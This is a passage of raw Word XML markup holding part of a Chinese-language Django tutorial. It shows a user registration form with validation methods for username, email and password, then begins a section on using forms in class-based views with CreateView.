        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return re.match(pattern, email)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2954DB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="791BE742" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class RegistrationForm(forms.Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7C82CE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B5F39A5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    username = forms.CharField(label='Username', max_length=50)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2122284D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    email = forms.EmailField(label='Email',)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC69947" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    password1 = forms.CharField(label='Password', widget=forms.PasswordInput)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265876F5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    password2 = forms.CharField(label='Password Confirmation', widget=forms.PasswordInput)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE7A8BA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D11E1C3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Use clean methods to define custom validation rules</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF3F8EA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CF2D4B4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def clean_username(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE665CA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        username = self.cleaned_data.get('username')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2346751E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="043924D9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if len(username) &lt; 6:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAF4240"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forms.ValidationError("Your username must be at least 6 characters long.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4570124E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        elif len(username) &gt; 50:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D34A38"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forms.ValidationError("Your username is too long.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C610EB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DADB4E2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            filter_result = User.objects.filter(username__exact=username)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27147F30" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            if len(filter_result) &gt; 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B695C25"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forms.ValidationError("Your username already exists.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034630D6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="501D39CE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return username</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B283772" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="549E3A57" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def clean_email(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528CC4DA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        email = self.cleaned_data.get('email')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374CEBE6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="076A5014" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if email_check(email):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4586B10A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            filter_result = User.objects.filter(email__exact=email)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25051822" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            if len(filter_result) &gt; 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546580AE"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forms.ValidationError("Your email already exists.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760D754D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009FA3CA"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forms.ValidationError("Please enter a valid email.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5258C4CC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B3FEC64" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return email</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025A3689" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2215D222" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def clean_password1(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226152A5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        password1 = self.cleaned_data.get('password1')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106E80A7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CF30BA0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if len(password1) &lt; 6:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389B9BAB"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forms.ValidationError("Your password is too short.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270253F0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        elif len(password1) &gt; 20:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C85DD45"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forms.ValidationError("Your password is too long.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6277EE93" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="141E33A2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return password1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B938793" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B2420AC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def clean_password2(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62623958" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        password1 = self.cleaned_data.get('password1')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4464B1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        password2 = self.cleaned_data.get('password2')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED7236E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A43CE59" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if password1 and password2 and password1 != password2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585708A7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise forms.ValidationError("Password mismatch. Please enter again.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6811FB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36384CE3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return password2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBFA195" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EA6CF15" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通用视图里使用表单</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40633F81" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在Django基于类的视图(Class Based View)里使用表单也非常容易，只需定义form_class就好了。下面是一个创建一篇新文章的例子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45829E18" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47581F4F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic.edit import CreateView</w:t>
      </w:r>
    </w:p>
